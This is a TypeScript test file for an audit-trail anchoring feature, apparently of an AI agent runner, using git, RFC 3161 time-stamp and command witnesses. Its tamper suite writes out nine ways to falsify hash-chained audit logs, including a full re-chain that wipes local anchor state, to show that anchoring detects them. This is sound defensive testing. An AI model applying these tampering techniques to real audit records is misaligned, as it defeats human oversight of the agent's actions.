  it("reads this machine's copy when the remote is unreachable, and says so", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c));
    rmSync(remote, { recursive: true, force: true });
    const rep = await report(c, [p]);
    expect(rep.source).toBe("local-copy");
    expect(rep.problems.join(" ")).toMatch(/local copy instead/);
    expect(rep.trails[0]!.status).toBe("unchecked");
    expect(rep.ok).toBe(false);
    // Asked for explicitly, the local copy is accepted.
    expect((await report(c, [p], { offline: true })).ok).toBe(true);
  });

  it("anchors from another checkout sharing the witness are counted, not judged", async () => {
    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    const p = sealTrail(c, "s1");
    const a = anchorOf(c);
    await flushAnchors(a);
    const elsewhere: ResolvedAnchor = { ...a, scope: "0123456789abcdef" };
    const last = load(p).pop()!;
    enqueueAnchor(elsewhere, join(root, ".gnomon-audit", "theirs.jsonl"), last, 9);
    await flushAnchors(elsewhere);
    const rep = await report(c, [p]);
    expect(rep.other_scopes).toBe(1);
    expect(rep.missing).toEqual([]);
    expect(rep.ok).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// rfc3161
// ---------------------------------------------------------------------------

/**
 * An in-process time-stamp authority: an EC P-256 key, no certificates. Its
 * public key is what a surface pins. `mode` breaks it on purpose.
 */
function fakeTsa(key: KeyObject, mode: "ok" | "refuse" | "wrong-imprint" = "ok"): typeof fetch {
  let serial = 1;
  return (async (_url: unknown, init?: RequestInit) => {
    const req = readDer(Buffer.from(init!.body as Uint8Array));
    const [, imprint, nonce] = childrenOf(req);
    if (mode === "refuse") return new Response(new Uint8Array(der.seq(der.seq(der.int(2)))), { status: 200 });
    let imprintBytes = Buffer.from(derBytes(imprint!));
    if (mode === "wrong-imprint") {
      imprintBytes = der.seq(der.seq(der.oid(OID.sha256), der.null()), der.octet(Buffer.alloc(32, 7)));
    }
    const tst = der.seq(der.int(1), der.oid("1.2.3.4.1"), imprintBytes, der.int(serial++), der.gtime(new Date()), Buffer.from(derBytes(nonce!)));
    const attrs = [
      der.seq(der.oid(OID.contentType), der.set(der.oid(OID.tstInfo))),
      der.seq(der.oid(OID.messageDigest), der.set(der.octet(createHash("sha256").update(tst).digest()))),
    ];
    const signature = sign("sha256", der.set(...attrs), key);
    const signerInfo = der.seq(
      der.int(1),
      der.seq(der.seq(), der.int(1)),
      der.seq(der.oid(OID.sha256)),
      der.ctx(0, Buffer.concat(attrs)),
      der.seq(der.oid(OID.ecdsaSha256)),
      der.octet(signature)
    );
    const signedData = der.seq(
      der.int(3),
      der.set(der.seq(der.oid(OID.sha256))),
      der.seq(der.oid(OID.tstInfo), der.ctx(0, der.octet(tst))),
      der.set(signerInfo)
    );
    const resp = der.seq(der.seq(der.int(0)), der.seq(der.oid(OID.signedData), der.ctx(0, signedData)));
    return new Response(new Uint8Array(resp), { status: 200, headers: { "content-type": "application/timestamp-reply" } });
  }) as unknown as typeof fetch;
}

function tsaKeys() {
  const { privateKey, publicKey } = generateKeyPairSync("ec", { namedCurve: "prime256v1" });
  return { privateKey, pin: publicKey.export({ format: "pem", type: "spki" }).toString() };
}

describe("rfc3161 backend", () => {
  it("builds a request OpenSSL reads: v1, sha256 imprint, nonce, certReq", () => {
    const digest = "ab".repeat(32);
    const req = readDer(timeStampRequest(digest, Buffer.from("0102030405060708", "hex")));
    const [version, imprint, nonce, certReq] = childrenOf(req);
    expect(derContent(version!)).toEqual(Buffer.from([1]));
    const [alg, hashed] = childrenOf(imprint!);
    expect(decodeOid(childrenOf(alg!)[0]!)).toBe(OID.sha256);
    expect(derContent(hashed!).toString("hex")).toBe(digest);
    expect(derContent(nonce!).toString("hex")).toBe("0102030405060708");
    expect(derContent(certReq!)).toEqual(Buffer.from([0xff]));
  });

  it("verifies a real OpenSSL TSA token offline: RSA, the TSA certificate embedded, the root pinned", () => {
    const fx = JSON.parse(readFileSync(join(process.cwd(), "..", "..", "conformance", "anchor_rfc3161_openssl.json"), "utf-8"));
    const resp = parseTimeStampResponse(Buffer.from(fx.response_base64, "base64"));
    expect(resp.status).toBe(0);
    const digest = statementDigest(fx.statement);
    expect(digest).toBe(fx.digest);
    const ok = verifyTimeStampToken(resp.token!, { digestHex: digest, pinned: fx.root_certificate });
    expect(ok).toMatchObject({ valid: true, checked: true, signer: "CN=gnomon test TSA" });
    expect(ok.info?.gen_time).toBe(fx.expect.gen_time);
    // Pinning the TSA's own certificate works too.
    expect(verifyTimeStampToken(resp.token!, { digestHex: digest, pinned: fx.tsa_certificate }).valid).toBe(true);
    // Each of these is a definite finding, not "could not check".
    expect(verifyTimeStampToken(resp.token!, { digestHex: "00".repeat(32), pinned: fx.root_certificate })).toMatchObject({ valid: false, checked: true });
    const flipped = Buffer.from(resp.token!);
    flipped[flipped.length - 5] ^= 1;
    expect(verifyTimeStampToken(flipped, { digestHex: digest, pinned: fx.root_certificate })).toMatchObject({ valid: false, checked: true });
    const other = tsaKeys().pin;
    expect(verifyTimeStampToken(resp.token!, { digestHex: digest, pinned: other })).toMatchObject({ valid: false, checked: true });
    // Nothing pinned: the imprint is checked, the signer is not, and it says so.
    expect(verifyTimeStampToken(resp.token!, { digestHex: digest, pinned: null })).toMatchObject({ valid: true, checked: false });
  });

  it("delivers to the authority, keeps the token, and catches the re-chain with the authority's time", async () => {
    const { privateKey, pin } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/", tsa_cert: pin });
    const p = sealTrail(c, "s1");
    const r = await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey) });
    expect(r).toMatchObject({ delivered: 1, pending: 0 });
    let rep = await report(c, [p]);
    expect(rep.source).toBe("receipts");
    expect(rep.trails[0]!.status).toBe("anchored");
    expect(rep.ok).toBe(true);

    rechain(p, (rs) => {
      rs[1]!.target = "secrets.env";
    });
    rep = await report(c, [p]);
    expect(rep.trails[0]!.status).toBe("rechained");
    expect(rep.trails[0]!.first_mismatch!.via).toMatch(/^rfc3161 serial /);
  });

  it("a receipt edited on disk does not verify", async () => {
    const { privateKey, pin } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/", tsa_cert: pin });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey) });
    // Rewrite the trail AND the receipt's statement to match it: the token
    // still time-stamps the original digest.
    rechain(p, (rs) => {
      rs[1]!.target = "x";
    });
    const file = join(auditDir(), "anchors", "receipts.jsonl");
    const rec = JSON.parse(readFileSync(file, "utf-8").trim());
    const last = load(p).pop()!;
    rec.statement = { ...rec.statement, hash: last.hash };
    rec.digest = statementDigest(rec.statement as AnchorStatement);
    writeFileSync(file, `${JSON.stringify(rec)}\n`);
    const t = (await report(c, [p])).trails[0]!;
    expect(t.status).toBe("invalid");
    expect(t.detail).toMatch(/time-stamps/);
  });

  it("without a pinned certificate the tokens are kept and reported unchecked", async () => {
    const { privateKey } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/" });
    const p = sealTrail(c, "s1");
    await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey) });
    const rep = await report(c, [p]);
    expect(rep.trails[0]!.status).toBe("unchecked");
    expect(rep.ok).toBe(false);
  });

  it("an authority that refuses, or answers for another digest, leaves the head queued", async () => {
    const { privateKey, pin } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/", tsa_cert: pin });
    sealTrail(c, "s1");
    let r = await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey, "refuse") });
    expect(r).toMatchObject({ delivered: 0, pending: 1 });
    expect(r.error).toMatch(/refused \(status 2\)/);
    r = await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey, "wrong-imprint") });
    expect(r.error).toMatch(/does not verify/);
    expect(pendingAnchors(anchorOf(c))).toHaveLength(1);
  });

  it("a head sealed while a delivery runs goes out with that delivery", async () => {
    const { privateKey, pin } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/", tsa_cert: pin });
    sealTrail(c, "s1");
    const tsa = fakeTsa(privateKey);
    let sealed = false;
    const during = (async (url: string, init?: RequestInit) => {
      if (!sealed) {
        sealed = true;
        sealTrail(c, "s2");
      }
      return tsa(url, init);
    }) as unknown as typeof fetch;
    expect(await flushAnchors(anchorOf(c), { fetch: during })).toMatchObject({ delivered: 2, pending: 0 });
  });

  it("a token signed by another key is refused at delivery", async () => {
    const { privateKey } = tsaKeys();
    const c = cfg({ backend: "rfc3161", url: "http://tsa.test/", tsa_cert: tsaKeys().pin });
    sealTrail(c, "s1");
    const r = await flushAnchors(anchorOf(c), { fetch: fakeTsa(privateKey) });
    expect(r.error).toMatch(/signature does not verify/);
  });
});

// ---------------------------------------------------------------------------
// cmd
// ---------------------------------------------------------------------------

describe("cmd backend", () => {
  // A witness the agent cannot write, stood for by a file outside the
  // workspace: the command appends the digest, the verifier looks it up.
  const witness = () => join(root, "..", `${root.split(/[\\/]/).pop()}-witness.txt`);
  const script = (name: string, body: string) => {
    const f = join(root, name);
    writeFileSync(f, body);
    chmodSync(f, 0o755);
    return `"${process.execPath}" "${f}"`;
  };

  afterEach(() => rmSync(witness(), { force: true }));

  it("delivers through the command and verifies through the verifier", async () => {
    const w = JSON.stringify(witness());
    const command = script("anchor.mjs", `import { appendFileSync, readFileSync } from "node:fs"; const d = readFileSync(0, "utf-8"); appendFileSync(${w}, d + "\\n"); process.stdout.write("witness-receipt:" + d.slice(0, 8));`);
    const verify = script("verify.mjs", `import { readFileSync } from "node:fs"; const d = readFileSync(0, "utf-8"); let have = ""; try { have = readFileSync(${w}, "utf-8"); } catch {} process.exit(have.split("\\n").includes(d) && process.env.GNOMON_ANCHOR_RECEIPT === "witness-receipt:" + d.slice(0, 8) ? 0 : 1);`);
    const c = cfg({ backend: "cmd", command, verify });
    const p = sealTrail(c, "s1");
    expect(await flushAnchors(anchorOf(c))).toMatchObject({ delivered: 1, pending: 0 });
    expect((await report(c, [p])).trails[0]!.status).toBe("anchored");

    // The witness lost it: the receipt no longer verifies.
    writeFileSync(witness(), "");
    expect((await report(c, [p])).trails[0]!.status).toBe("invalid");
  });

  it("a failing command leaves the head queued; no verifier means unchecked", async () => {
    const c1 = cfg({ backend: "cmd", command: "exit 3" });
    sealTrail(c1, "s1");
    const r = await flushAnchors(anchorOf(c1));
    expect(r).toMatchObject({ delivered: 0, pending: 1 });
    expect(r.error).toMatch(/exit 3/);

    const c2 = cfg({ backend: "cmd", command: "cat >/dev/null; echo ok" });
    rmSync(join(auditDir(), "anchors"), { recursive: true, force: true });
    const p = sealTrail(c2, "s2");
    await flushAnchors(anchorOf(c2));
    expect((await report(c2, [p])).trails[0]!.status).toBe("unchecked");
  });
});

// ---------------------------------------------------------------------------
// The record guard
// ---------------------------------------------------------------------------

describe("the record guard and the anchors directory", () => {
  it("a background delivery writing anchors/ mid-session is not tampering when anchoring is declared", async () => {
    const remote = bareRemote();
    mkdirSync(join(root, ".gnomon"), { recursive: true });
    const c = cfg({ backend: "git", remote });
    sealTrail(c, "earlier");
    const guard = RecordGuard.for(c);
    await flushAnchors(anchorOf(c));
    expect(readdirSync(join(auditDir(), "anchors"))).toContain("receipts.jsonl");
    expect(guard.check("between_calls")).toBeNull();
    // The checkpoint map leaves it out too, so the next session does not see it.
    const cp = writeCheckpoint(c)!;
    expect(Object.keys(JSON.parse(readFileSync(cp.map, "utf-8"))).some((k) => k.includes("anchors/"))).toBe(false);
  });

  it("without [audit.anchor], a file there is a change like any other (unchanged behaviour)", () => {
    mkdirSync(join(root, ".gnomon"), { recursive: true });
    const c = cfg();
    sealTrail(c, "earlier");
    const guard = RecordGuard.for(c);
    mkdirSync(join(auditDir(), "anchors"), { recursive: true });
    writeFileSync(join(auditDir(), "anchors", "receipts.jsonl"), "{}\n");
    expect(guard.check("between_calls")?.changes.length).toBe(1);
  });
});

// ---------------------------------------------------------------------------
// Through `gnomon task`'s entry point
// ---------------------------------------------------------------------------

describe("through runTask", () => {
  function surface(anchorToml: string): void {
    const put = (rel: string, text: string) => {
      mkdirSync(join(root, rel, ".."), { recursive: true });
      writeFileSync(join(root, rel), text, "utf-8");
    };
    put(
      ".gnomon/config.toml",
      `[defaults]\napproval = "on_write"\n\n[endpoints.local]\nurl = "http://127.0.0.1:9/api/chat"\nkind = "ollama"\n\n[audit]\nenabled = true\n\n[audit.anchor]\n${anchorToml}\n`
    );
    put(".gnomon/roles.toml", `[roles.implement]\nmodel = "stub"\nendpoint = "local"\ntools = ['read']\n`);
    put(".gnomon/tools.toml", `[[tools]]\nname = "read"\nenabled = true\n`);
    put(".gnomon/policy.toml", `[approval]\ngate = "on_write"\n`);
    put(".gnomon/system.md", "x\n");
  }

  async function task() {
    const { runTask } = await import("./prompt_loop.js");
    const { loadConfig } = await import("./config.js");
    const original = globalThis.fetch;
    const write = process.stderr.write.bind(process.stderr);
    const said: string[] = [];
    globalThis.fetch = (async () => ({ ok: true, json: async () => ({ message: { content: "done" }, eval_count: 1 }) })) as unknown as typeof fetch;
    process.stderr.write = ((chunk: unknown) => {
      said.push(String(chunk));
      return true;
    }) as typeof process.stderr.write;
    try {
      const record = await runTask(loadConfig(root), "go", { role: "implement", yes: true, verbose: false });
      return { record, stderr: said.join("") };
    } finally {
      globalThis.fetch = original;
      process.stderr.write = write;
    }
  }

  it("a task's trail and its checkpoint are queued at seal; a backlog is announced and recorded by the next task; delivery anchors them all", async () => {
    const remote = join(remotes, "witness.git");
    surface(`backend = "git"\nremote = "${remote.replace(/\\/g, "/")}"`);
    const { loadConfig } = await import("./config.js");
    const a = () => anchorOf(loadConfig(root));

    const first = await task();
    expect(first.record.bucket).toBe("result");
    const queued = pendingAnchors(a()).map((q) => q.statement.trail);
    expect(queued).toHaveLength(2);
    expect(queued.some((t) => /^\.gnomon-audit\/task-.*\.jsonl$/.test(t))).toBe(true);
    expect(queued.some((t) => /checkpoints\/checkpoint-/.test(t))).toBe(true);
    // Scheduled at the checkpoint, not delivered on the way.
    expect(captured.length).toBeGreaterThan(0);
    expect(first.stderr).not.toMatch(/anchor/);

    // The witness is not there yet: the delivery fails and the heads stay.
    expect((await flushAnchors(a())).error).toMatch(/unreachable/);
    const second = await task();
    expect(second.stderr).toMatch(/\[anchor\] 2 sealed trail head\(s\) .* not yet anchored to git/);
    expect(second.record.degradations).toEqual(expect.arrayContaining([expect.objectContaining({ id: "audit_anchor_queued" })]));

    git(["init", "--bare", "-q", remote]);
    expect(await flushAnchors(a())).toMatchObject({ pending: 0 });
    // Trails only: each task also leaves its live record, `<session>.record.json`,
    // beside its trail (live_record.ts), and that is not a trail.
    const trails = readdirSync(auditDir()).filter((f) => f.startsWith("task-") && f.endsWith(".jsonl")).map((f) => join(auditDir(), f));
    const rep = await report(loadConfig(root), trails);
    expect(rep.trails.map((t) => t.status)).toEqual(["anchored", "anchored"]);
    expect(rep.ok).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// The tamper suite, with and without the anchor
// ---------------------------------------------------------------------------

describe("auditability tamper suite (benchmarks/results/auditability-2026-11-03)", () => {
  // The nine attacks of benchmarks/results/auditability-2026-08-31/tamper.mjs,
  // verbatim. The last test below holds the names to that script, so the two
  // cannot drift apart.
  const rechainAll = (rs: AuditRecord[]) => {
    let prev: string | null = null;
    for (const r of rs) {
      r.prev = prev;
      delete r.hash;
      r.hash = recordHash(r);
      prev = r.hash;
    }
    return rs;
  };
  const ATTACKS: Array<[string, (rs: AuditRecord[]) => AuditRecord[]]> = [
    ["edit-a-field", (rs) => { rs[2]!.role = "root"; return rs; }],
    ["delete-a-record", (rs) => { rs.splice(2, 1); return rs; }],
    ["reorder-records", (rs) => { const t = rs[2]!; rs[2] = rs[3]!; rs[3] = t; return rs; }],
    ["append-forged-tail", (rs) => { const f = { ...rs[rs.length - 1]! }; f.seq = 999; f.kind = "tool_call"; f.hash = recordHash(f); rs.push(f); return rs; }],
    ["truncate-the-tail", (rs) => rs.slice(0, 3)],
    ["strip-one-hash", (rs) => { delete rs[2]!.hash; return rs; }],
    ["insert-hashless", (rs) => { const f = { ...rs[2]!, seq: 998, kind: "tool_call" as const }; delete f.hash; rs.splice(3, 0, f); return rs; }],
    ["edit-and-rehash-one", (rs) => { rs[2]!.role = "root"; delete rs[2]!.hash; rs[2]!.hash = recordHash(rs[2]!); return rs; }],
    ["full-rewrite", (rs) => { rs[2]!.role = "root"; return rechainAll(rs); }],
  ];
  const SAMPLE = join(process.cwd(), "..", "..", "benchmarks", "results", "auditability-2026-08-31", "sample-trail.jsonl");

  async function run(anchored: boolean): Promise<Array<{ attack: string; detected: boolean }>> {
    const rows: Array<{ attack: string; detected: boolean }> = [];
    for (const [name, mutate] of ATTACKS) {
      const remote = anchored ? bareRemote(`${name}.git`) : "";
      const c = anchored ? cfg({ backend: "git", remote }) : cfg();
      mkdirSync(auditDir(), { recursive: true });
      const p = join(auditDir(), `${name}.jsonl`);
      cpSync(SAMPLE, p);
      if (anchored) {
        // As AuditTrail does at seal, then delivered.
        const rs = load(p);
        enqueueAnchor(anchorOf(c), p, rs[rs.length - 1]!, rs.length);
        expect((await flushAnchors(anchorOf(c))).delivered).toBe(1);
      }
      save(p, mutate(load(p)));
      if (anchored) {
        // The attacker knows about anchoring: the local anchor state goes too.
        rmSync(join(auditDir(), "anchors"), { recursive: true, force: true });
      }
      const v = verifyTrail(p);
      let detected = !v.ok || v.sealed === false;
      if (anchored) {
        const t = (await report(c, [p])).trails[0]!;
        detected ||= t.status === "rechained" || t.status === "invalid";
      }
      rows.push({ attack: name, detected });
    }
    return rows;
  }

  it("anchoring off: 8/9, the full re-chain undetected (unchanged)", async () => {
    const rows = await run(false);
    expect(rows.filter((r) => r.detected).length).toBe(8);
    expect(rows.find((r) => !r.detected)?.attack).toBe("full-rewrite");
  });

  it("anchoring on (git witness, attacker wipes the local anchor state): 9/9", async () => {
    const rows = await run(true);
    expect(rows.filter((r) => r.detected).map((r) => r.attack)).toEqual(ATTACKS.map(([n]) => n));
  });

  it("the attack list is the benchmark's", () => {
    const script = readFileSync(join(process.cwd(), "..", "..", "benchmarks", "results", "auditability-2026-08-31", "tamper.mjs"), "utf-8");
    const names = [...script.matchAll(/^\s+\["([a-z-]+)",/gm)].map((m) => m[1]);
    expect(names).toEqual(ATTACKS.map(([n]) => n));
  });
});

describe("conformance/audit_anchor.json", () => {
  it("statement keys, receipt keys, backends and the degradation id match the fixture", async () => {
    const fx = JSON.parse(readFileSync(join(process.cwd(), "..", "..", "conformance", "audit_anchor.json"), "utf-8"));
    const { ANCHOR_BACKENDS } = await import("./anchor.js");
    const { DEGRADATION_IDS } = await import("./degradation.js");
    expect([...ANCHOR_BACKENDS]).toEqual(fx.backends);
    expect(ANCHOR_FORMAT).toBe(fx.statement_format);
    expect(DEGRADATION_IDS).toContain(fx.degradation_id);

    const remote = bareRemote();
    const c = cfg({ backend: "git", remote });
    sealTrail(c, "s1");
    const q = pendingAnchors(anchorOf(c))[0]!;
    expect(Object.keys(q.statement).sort()).toEqual([...fx.statement_keys].sort());
    expect(Object.keys(q).sort()).toEqual([...fx.queue_entry_keys].sort());
    await flushAnchors(anchorOf(c));
    const rec = JSON.parse(readFileSync(join(auditDir(), "anchors", "receipts.jsonl"), "utf-8").trim());
    expect(Object.keys(rec).sort()).toEqual([...fx.receipt_keys].sort());
    expect(Object.keys(rec.receipt).sort()).toEqual([...fx.receipt_by_backend.git].sort());
    const tip = git(["--git-dir", remote, "rev-parse", fx.git.default_ref]);
    expect(git(["--git-dir", remote, "ls-tree", "--name-only", tip])).toBe(fx.git.file);
  });
});

// ---------------------------------------------------------------------------
// flush.lock: released on every way out
// ---------------------------------------------------------------------------

describe("flush.lock", () => {
  // GBS-AUDIT 0.1 (benchmarks/results/gbs-2026-11-04/audit): after 22 of 22
  // anchored `gnomon task`s on the v0.4.1 release, anchors/flush.lock was left
  // behind with no delivery running, and `gnomon audit anchor` said "already
  // running" until the lock aged past 120 s. The installed package has no
  // gnomon.js, so the CLI fell back to an unawaited in-process flush, and the
  // task's process.exit skipped flushAnchors' `finally`.
  const lockOf = (c: GnomonConfig) => join(anchorOf(c).dir, "flush.lock");
  const here = fileURLToPath(new URL(".", import.meta.url));

  it("a process that exits mid-delivery releases the lock; its statements stay queued", () => {
    const c = cfg({ backend: "rfc3161", url: "http://tsa.invalid/" });
    sealTrail(c, "s1");
    const anchor = anchorOf(c);
    // A child holding the lock, whose witness never answers, then process.exit:
    // the path `gnomon task` took. No network: the transport is a stub.
    const script =
      `import { flushAnchors } from ${JSON.stringify(new URL("./anchor.ts", import.meta.url).href)};\n` +
      `const s = ${JSON.stringify(anchor)};\n` +
      `void flushAnchors(s, { fetch: () => new Promise(() => {}) });\n` +
      `setTimeout(() => { process.stdout.write("held=" + String(existsSync(join(s.dir, "flush.lock")))); process.exit(0); }, 300);\n` +
      `import { existsSync } from "node:fs";\nimport { join } from "node:path";\n`;
    const r = spawnSync(process.execPath, ["--import", "tsx", "--input-type=module", "-e", script], { encoding: "utf-8", cwd: join(here, "..") });
    expect(r.status, r.stderr).toBe(0);
    expect(r.stdout).toBe("held=true");
    expect(existsSync(lockOf(c))).toBe(false);
    expect(readdirSync(join(anchor.dir, "queue"))).toHaveLength(1);
  });

  it("a lock whose holder is gone is taken over at once, not after 120 s", async () => {
    const c = cfg({ backend: "rfc3161", url: "http://tsa.invalid/" });
    sealTrail(c, "s1");
    const gone = spawnSync(process.execPath, ["-e", "process.stdout.write(String(process.pid))"], { encoding: "utf-8" });
    const dead = Number(gone.stdout);
    mkdirSync(anchorOf(c).dir, { recursive: true });
    writeFileSync(lockOf(c), JSON.stringify({ pid: dead, host: hostname(), at: new Date().toISOString() }));
    const refused = (async () => {
      throw new Error("unreachable");
    }) as unknown as typeof fetch;
    const r = await flushAnchors(anchorOf(c), { fetch: refused });
    expect(r.busy).toBeUndefined();
    expect(r.pending).toBe(1);
    expect(existsSync(lockOf(c))).toBe(false);
  });

  it("a live holder, another host's lock, or a lock with no pid (an older gnomon's) still means busy", async () => {
    const c = cfg({ backend: "rfc3161", url: "http://tsa.invalid/" });
    sealTrail(c, "s1");
    mkdirSync(anchorOf(c).dir, { recursive: true });
    for (const body of [
      JSON.stringify({ pid: process.ppid, host: hostname() }),
      JSON.stringify({ pid: 999_999_999, host: `not-${hostname()}` }),
      "",
    ]) {
      writeFileSync(lockOf(c), body);
      expect((await flushAnchors(anchorOf(c))).busy).toBe(true);
      expect(readFileSync(lockOf(c), "utf-8")).toBe(body);
    }
  });
});
